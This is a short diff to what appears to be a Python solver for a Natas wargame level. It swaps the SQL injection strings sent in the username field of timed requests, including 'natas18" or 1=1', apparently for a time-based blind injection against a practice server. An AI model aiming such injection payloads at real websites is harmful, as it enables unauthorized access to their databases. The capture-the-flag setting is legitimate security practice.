@@ -21,7 +21,7 @@ def solve(url: str, login: LevelLogin) -> Optional[str]:
     success_start = time.perf_counter()
     for _ in range(10):
         success_params = {
-            "username": "\" or 1=1",
+            "username": "natas18\" or 1=1",
             "submit": "Check existence",
             "debug": "true",
         }
@@ -33,7 +33,7 @@ def solve(url: str, login: LevelLogin) -> Optional[str]:
     fail_start = time.perf_counter()
     for _ in range(10):
         fail_params = {
-            "username": "\" and 0=1",
+            "username": "natas18\" aaaaaa aaaa aaa - + + * + aaaaaa",
             "submit": "Check existence",
             "debug": "true",
         }
